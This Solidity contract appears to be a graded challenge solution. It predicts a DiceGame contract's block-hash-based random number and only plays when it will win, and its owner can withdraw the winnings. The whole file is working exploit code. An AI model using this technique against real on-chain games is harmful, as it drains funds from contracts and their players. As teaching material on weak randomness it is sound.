pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./DiceGame.sol";


contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    //This is the state variable to store the address of the diceGameAddress
    address private dicegameaddress;

    constructor(address payable diceGameAddress) {
        dicegameaddress=diceGameAddress;
        diceGame = DiceGame(diceGameAddress);
    }

    //This is the nonce
    uint private nonce=0;

    //This is the modifier to ensure that the riggedRoll function is called only if the address(this).balance >=0.002 ethers
    modifier allow{
        require(address(this).balance>=0.002 ether,"The contract doesn't have the required balance");
        _;
    }

    function getbalance() public view returns(uint)
    {
        return address(this).balance;
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    //This function will transfer the ethers to the frontend address which is the owner of the smart contract
    function withdraw(address _addr,uint256 amount) public onlyOwner{
        payable(_addr).transfer(amount);
        // payable(_addr).transfer(amount);
    }



    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    //This function basically replicates what the DiceGame smart contract does to produce the random numbers
    //Here we generate a random number and if it is a winner number then in that case call the rollTheDice function
    function riggedRoll() public allow payable{

        //Now we again generate a random number
    
        //This is the hash of the previous block number
        bytes32 prevhash=blockhash(block.number-1);

        //Now using the hash of the previous block, the address of the smart contract  and the nonce
        bytes32 finalhash=keccak256(abi.encodePacked(prevhash,dicegameaddress,nonce));

        //Now we perform the num% 16 to generate the random number
        uint256 randomnumber=uint256(finalhash)%16;

        nonce++;

        if(randomnumber==0 || randomnumber==1 || randomnumber==2)
        {
            //This means that this is the winner number and hence we can call the rollTheDice function
            diceGame.rollTheDice{value: 0.002 ether}();
        }
        else{
            //This means that the random number has not been generated and hence do nothig
            revert("The value is greater than 2");
        }
    }
 
   

    //Add receive() function so contract can receive Eth
    //With the help of the receive function the RiggedRoll smart contract can receive ethers
    receive() external payable{
        uint balance=address(this).balance;
        console.log("The balance of the smart contract is:",balance);
    }
    
}
